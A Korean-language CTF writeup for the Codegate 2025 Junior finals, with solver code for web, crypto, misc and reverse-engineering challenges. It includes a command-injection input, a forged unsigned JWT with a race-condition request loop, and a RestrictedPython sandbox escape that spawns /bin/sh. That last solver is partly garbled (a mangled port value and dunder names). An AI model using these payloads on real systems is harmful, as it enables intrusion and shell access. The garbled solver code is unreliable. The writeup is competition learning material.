---
title: Codegate 2025 Junior Finals Writeup
date: 2025-03-30 / +0900
categories: [CTF Writeups]
tags: [Web, Crypto, Rev, Misc]
toc: true
pin: false
comments: true
math: false
mermaid: false
---

## web/Ping Tester (250 points, 102 solves)

`1.1.1.1 && cat flag` 을 입력하면 flag를 얻을 수 있다.

`codegate2025{80fd12690c4d31a8cf3fe2865e3ceb99aca9e6047c6acb2cbb9157e26ec91f4b}`

## web/Token Rush (275 points, 17 solves)

먼저 코드를 보자.

{: file="index.js"}

```js
const express = require("express");
const cookieParser = require("cookie-parser");
const crypto = require("node:crypto");
const fs = require("fs");
const path = require("path");
const b64Lib = require("base64-arraybuffer");
const flag = "codegate2025{FAKE_FLAG}";
const PrivateKey = `FAKE_PRIVATE_KEY`;
const PublicKey = `63c9b8f6cc06d91f1786aa3399120957f2f4565892a6763a266d54146e6d4af9`;
const tokenDir = path.join(__dirname, "token");

const app = express();
app.use(express.json());
app.use(cookieParser());
app.set("view engine", "ejs");
Object.freeze(Object.prototype);
fs.promises.mkdir(tokenDir, { recursive: true });

let db = {
  admin: {
    uid: "87c869e7295663f2c0251fc31150d0e3",
    pw: crypto.randomBytes(32).toString("hex"),
    name: "administrator",
  },
};

let temporaryFileName = path.join(
  tokenDir,
  crypto.randomBytes(32).toString("hex")
);

const gen_hash = async () => {
  let data = "";
  for (var i = 0; i < 1234; i++) {
    data += crypto.randomBytes(1234).toString("hex")[0];
  }
  const hash = crypto.createHash("sha256").update(data);
  return hash.digest("hex").slice(0, 32);
};

const gen_JWT = async (alg, userId, key) => {
  const strEncoder = new TextEncoder();
  let headerData = urlsafe(
    b64Lib.encode(strEncoder.encode(JSON.stringify({ alg: alg, typ: "JWT" })))
  );
  let payload = urlsafe(
    b64Lib.encode(strEncoder.encode(JSON.stringify({ uid: userId })))
  );
  if (alg == "ES256") {
    let baseKey = await crypto.subtle.importKey(
      "pkcs8",
      b64Lib.decode(key),
      { name: "ECDSA", namedCurve: "P-256" },
      true,
      ["sign"]
    );
    let sig = await crypto.subtle.sign(
      { name: "ECDSA", hash: "SHA-256" },
      baseKey,
      new TextEncoder().encode(`${headerData}.${payload}`)
    );
    return `${headerData}.${payload}.${urlsafe(
      b64Lib.encode(new Uint8Array(sig))
    )}`;
  }
};

const read_JWT = async (token) => {
  const decoder = new TextDecoder();
  let payload = token.split(".")[1];
  return JSON.parse(
    decoder.decode(b64Lib.decode(decodeurlsafe(payload))).replaceAll("\x00", "")
  );
};

const urlsafe = (base) =>
  base.replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
const decodeurlsafe = (dat) => dat.replace(/-/g, "+").replace(/_/g, "/");

app.post("/", () => {});

app.post("/sign_in", async (req, res) => {
  try {
    const { id, pw } = req.body;
    if (!db[id] || db[id]["pw"] !== pw) {
      res.json({ message: "Invalid credentials" });
      return;
    }
    let token = await gen_JWT("ES256", db[id]["uid"], PrivateKey);
    res.cookie("check", token, { maxAge: 100 }).json({ message: "Success" });
  } catch (a) {
    res.json({ message: "Failed" });
  }
});

app.post("/sign_up", async (req, res) => {
  try {
    const { id, data } = req.body;
    if (id.toLowerCase() === "administrator" || db[id]) {
      res.json({ message: "Unallowed key" });
      return;
    }
    db[id] = { ...data, uid: crypto.randomBytes(32).toString("hex") };
    res.json({ message: "Success" });
  } catch (a) {
    res.json({ message: "Failed" });
  }
});

app.post("/2fa", async (req, res) => {
  try {
    const token = req.cookies.check ?? "";
    const data = await read_JWT(token, PublicKey);
    if (db.admin.uid !== data.uid) {
      res.json({ message: "Permission denied" });
      return;
    }
    let rand_data = await gen_hash();
    await fs.promises.writeFile(temporaryFileName, rand_data);
    res.json({ message: "Success" });
  } catch (a) {
    res.json({ message: "Unauthorized" });
  }
});

app.post("/auth", async (req, res) => {
  try {
    const token = req.cookies.check ?? "";
    const data = await read_JWT(token, PublicKey);
    if (db.admin.uid !== data.uid) {
      res.json({ message: "Permission denied" });
      return;
    }
    const { data: input } = req.body;
    const storedData = await fs.promises.readFile(temporaryFileName, "utf-8");
    if (input === storedData) {
      res.json({ flag });
    } else {
      res.json({ message: "Token Error" });
    }
  } catch (a) {
    res.json({ message: "Internal Error" });
  }
});

app.post("/data", (req, res) => {
  res
    .status(req.body.auth_key ? 200 : 400)
    .send(req.body.auth_key ? "Success" : "Failed");
});

app.listen(1234);
```

코드를 보면 알 수 있든 flag를 얻기 위해서는 admin 계정으로 로그인 한 후 랜덤한 값을 생성하고 그 값을 맞출 필요가 있다.

admin 계정은 `read_JWT`의 서명을 확인하지 않는 취약점을 통해 쉽게 얻을 수 있다.

그러나, 1234개의 랜덤한 값을 맞추는 것은 불가능하다.
따라서, 다른 방법을 생각해볼 필요가 있었다.

코드를 둘러보던 중 `gen_hash`의 생성 방식이 불필요하게 복잡하다는 것을 알았다.
그래서, **race condition**을 이용하는 것이라 생각했다.

실제로 테스트를 해보니 `writeFile`과 `readFile`에서 **race condition**이 발생해 length가 0인 파일을 읽어오는 것을 확인 할 수 있었다.

이를 이용해서 익스플로잇 코드를 작성하면 다음과 같다.

{: file="solver.ts"}

```ts
import { logger, randomStr } from "@utils";
import { create } from "@web";
import jwt from "jsonwebtoken";

const r = create({
  baseURL: "http://15.165.43.224:1234/",
  defaultPostContentType: "application/json",
  ignoreHttpErrors: true,
});

const token = jwt.sign({ uid: "87c869e7295663f2c0251fc31150d0e3" }, "ehhh");

r.setCookie("check", token);

async function fn1() {
  while (true) {
    await Promise.all([r.post("/2fa")]);
  }
}

async function fn2() {
  while (true) {
    await Promise.all([
      r.post("/auth", { data: "" }).then((r) => logger.info(r.data)),
      r.post("/auth", { data: "" }).then((r) => logger.info(r.data)),
      r.post("/auth", { data: "" }).then((r) => logger.info(r.data)),
      r.post("/auth", { data: "" }).then((r) => logger.info(r.data)),
      r.post("/auth", { data: "" }).then((r) => logger.info(r.data)),
      r.post("/auth", { data: "" }).then((r) => logger.info(r.data)),
    ]);
  }
}

fn1();
fn2();
```

`codegate2025{8b2c743e13f766b30c9c1e72e8a6595a651321da1c01eda7776fbd8e209ef9feace5a162237e696ea4b58a7bdf0b88dfb7f25c5ac76f4e12a4c4538d438fcdbf}`

## web/Masquerade (Upsolving, 1000 points, 0 solve)

<!-- TODO add writeup -->

## web/Cha's Point (Upsolving, 1000 points, 1 solve)

<!-- TODO add writeup -->

## web/backoffice (Upsolving, 1000 points, 0 solve)

<!-- TODO add writeup -->

## crypto/Encrypted flag (250 points, 92 solves)

{: file="prob.py"}

```py
from Crypto.Util.number import bytes_to_long, getPrime
from sympy import nextprime
import gmpy2

p = getPrime(512)
q = nextprime(p)

n = p * q
e = 65537

flag = "codegate2025{FAKE_FLAG}"
phi = (p - 1) * (q - 1)

d = gmpy2.invert(e, phi)

m = bytes_to_long(flag.encode())
c = pow(m, e, n)

print(f"n: {n}")
print(f"e: {e}")
print("Encrypted flag:", c)
```

`n`, `e`, `c`를 알고 있으며, `q`가 `nextprime(p)`로 생성돼 `p`와 `q`의 차이가 크지 않다는 것을 알 수 있다.
이는 `Fermat's factorization`을 이용해 쉽게 `p`와 `q`를 구할 수 있다는 것을 의미한다.
`Fermat's factorization`을 이용해 `p`와 `q`를 구한 후, `d`를 구하고 `c`를 복호화하면 flag를 얻을 수 있다.

{: file="solver.py"}

```py
from Crypto.Util.number import long_to_bytes
from gmpy2 import *

n = 54756668623799501273661800933882720939597900879404357288428999230135977601404008182853528728891571108755011292680747299434740465591780820742049958146587060456010412555357258580332452401727868163734930952912198058084689974208638547280827744839358100210581026805806202017050750775163530268755846782825700533559
e = 65537
c = 7728462678531582833823897705285786444161591728459008932472145620845644046450565339835113761143563943610957661838221298240392904711373063097593852621109599751303613112679036572669474191827826084312984251873831287143585154570193022386338846894677372327190250188401045072251858178782348567776180411588467032159

def fermat_factor(n):
	assert n % 2 != 0

	s = isqrt(n)
	t2 = square(s) - n

	while not is_square(t2):
		s += 1
		t2 = square(s) - n
	p = s + isqrt(t2)
	q = s - isqrt(t2)
	return int(p), int(q)

p, q = fermat_factor(n)

phi = (p - 1) * (q - 1)
d = gmpy2.invert(e, phi)

print(long_to_bytes(pow(c, d, n)).decode())
```

`codegate2025{Cl0se_p_q_0f_RSA_Is_Vu1n3rabIe}`

## misc/Hello Codegate (250 points, 106 solves)

디스코드 공지 채널에서 flag를 얻을 수 있다.

`codegate2025{65782695e16255e3ef8517a1bfb059f0}`

## misc/Captcha World (250 points, 94 solves)

자동화도 가능하겠지만, 60초에 10개만 풀면 되니 자동화를 하지 않고 풀 수 있다.

![alt text](/assets/posts/2025-03-30-Codegate-2025-Junior-Quals/misc-captcha.webp)

`codegate2025{759272206a29a2b8fb6d7f8731ad29c291defc51af1d0a84ea58e54fc6fa3b24b414f78d63e030fd906f0c22c401c0}`

## misc/SafePythonExecutor (306 points, 15 solves)

{: file="executor.py"}

```py
import ast
from RestrictedPython import Eval
from RestrictedPython import Guards
from RestrictedPython import safe_globals
from RestrictedPython import compile_restricted, utility_builtins

TARGET_EXEC = "code"

class SafePythonExecutor:
    policy_globals = {**safe_globals, **utility_builtins}

    def __init__(self):
        self.policy_globals["__builtins__"]["__metaclass__"] = type
        self.policy_globals["__builtins__"]["__name__"] = type
        self.policy_globals["__builtins__"]["__import__"] = self.import_disallowed
        self.policy_globals["_getattr_"] = Guards.safer_getattr
        self.policy_globals["_getiter_"] = Eval.default_guarded_getiter
        self.policy_globals["_getitem_"] = Eval.default_guarded_getitem
        self.policy_globals["_write_"] = Guards.full_write_guard
        self.policy_globals["_iter_unpack_sequence_"] = Guards.guarded_iter_unpack_sequence
        self.policy_globals["_unpack_sequence_"] = Guards.guarded_unpack_sequence
        self.policy_globals["enumerate"] = enumerate

    def import_disallowed(name, *args, **kwargs):
        raise ImportError(f"Importing {name} is not allowed")

    def check_for_yield(self, code):
        """Check if the code contains a yield statement"""
        tree = ast.parse(code)
        for node in ast.walk(tree):
            if isinstance(node, ast.Yield):
                raise SyntaxError("Yield statement is not allowed")
        return code

    def execute_untrusted_code(self, code):
        code = self.check_for_yield(code)
        byte_code = compile_restricted(code, filename="<untrusted code>", mode="exec")
        result_local = {}
        exec(byte_code, self.policy_globals, result_local)
        print("Code executed successfully")

        if TARGET_EXEC not in result_local:
            raise ValueError(f"No '{TARGET_EXEC}' function found in the code")

        return result_local[TARGET_EXEC]()

if __name__ == "__main__":
    e = SafePythonExecutor()
    e.execute_untrusted_code(input("Enter your code: "))
```

`RestrictedPython`라는 라이브러리를 이용한 **jailbreak 문제**임을 알 수 있다.

<https://ur4ndom.dev/posts/2023-07-02-uiuctf-rattler-read/>에 나와 있는 익스플로잇 코드를 응용해 사용하면 된다.

{: file="solver.py"}

```py
from pwn import *

connection = remote('3.35.196.167', po42424rt)

python_code = """def code():
class Baz(string.Formatter): pass; get_field = lambda self, field_name, args, kwargs: (string.Formatter.get_field(self, field_name, args, kwargs)[0]("/bin/sh"), "");
return Baz().format("{0.Random.**init**.**globals**[_os].system}", random)
"""

connection.send(python_code.encode() + b'\n')

response = connection.interactive()
connection.close()

```

`codegate2025{ce66359384d8fa276408f2a648b0cd08f63ed1e066c66083efb736509093156881e3c093ab1f958854bcd211614dbfe408c8728a8f22}`

## rev/initial (250 points, 57 solves)

{: file="solver.py"}

```py
target = [
    54, -30, 46, -122, 109, 36, -51, -108, 26, 26, 70, -101, 73, -125, 97, 21,
    32, -78, 71, -22, 13, 66, -23, 61, -28, 116, 27, 22, -117, 84, 46, -86
]

target = [(x & 0xff) for x in target]

def reverse_rotation(value, shift):
    shift = shift & 6  # Same as in the original: j & 6
    return ((value >> (8 - shift)) | (value << shift)) & 0xff

def reverse_sbox(value, sbox):
    for i in range(256):
        if sbox[i] == value:
            return i
    return -1

sbox = [
    69, -72, 26, 128, 71, -53, -42, 25, 29, 88, 86, -30, 54, -28, 39, 101,
    -79, 115, -23, 92, 126, 66, 124, -34, 113, 97, -10, 72, -11, 34, 87, 27,
    -81, -37, -115, -117, -64, 43, -44, -95, -52, -14, -21, -66, 55, 56, -39, 30,
    99, -29, 77, -108, 19, -70, -100, -122, 16, 53, -4, 79, -41, -45, 123, 58,
    -55, -113, -48, 36, -15, 5, 44, 83, 94, -116, -106, 61, -90, -92, 110, -49,
    91, 109, 4, -19, 18, 122, 23, 37, 52, -36, -83, -31, 32, -111, 117, 6,
    -60, 116, 111, 120, 0, 108, -62, -85, -87, -97, -80, 22, 51, -112, -51, -78,
    60, -86, -101, 81, 78, 63, 28, 80, -6, 24, -24, -76, 84, -71, 59, 73,
    -7, -74, -103, -99, 125, 14, 102, -17, -1, 21, -105, 85, 15, -8, 33, 46,
    -125, -13, -107, 10, -88, -68, 93, -75, 50, -3, -9, -40, 38, -119, 100, 47,
    -89, -54, 13, -20, -61, -5, -84, -73, 9, -18, -124, -110, 121, 1, 7, -94,
    119, 74, 2, 96, 57, -96, -109, -67, -120, -58, -27, -25, -50, 35, -69, -33,
    -123, -63, 89, -22, -46, -102, -26, 49, 20, -2, -59, 68, 17, -121, 103, -47,
    75, -38, 106, 82, -65, 11, -12, 90, -118, 8, 40, -93, 127, 48, 112, -98,
    45, 12, -126, -82, 64, 104, 67, 118, -32, 62, -114, 42, 76, -91, -43, 105,
    114, -56, -127, 107, 70, -57, -77, 31, 95, -104, 41, -16, 98, 3, -35, 65
]

sbox = [(x & 0xff) for x in sbox]

s_after_xor = [0] * 32
for i in range(32):
    rotated_val = reverse_rotation(target[i], i & 6)
    s_after_xor[i] = reverse_sbox(rotated_val, sbox)

s_original = [0] * 32
s_original[31] = s_after_xor[31] ^ s_after_xor[0]

for i in range(30, -1, -1):
    s_original[i] = s_after_xor[i] ^ s_original[i + 1]

flag = ''.join(chr(c) for c in s_original)
print(f"Original input: {flag}")
```

`codegate2025{Hell0_W0r1d_R3V_^^}`
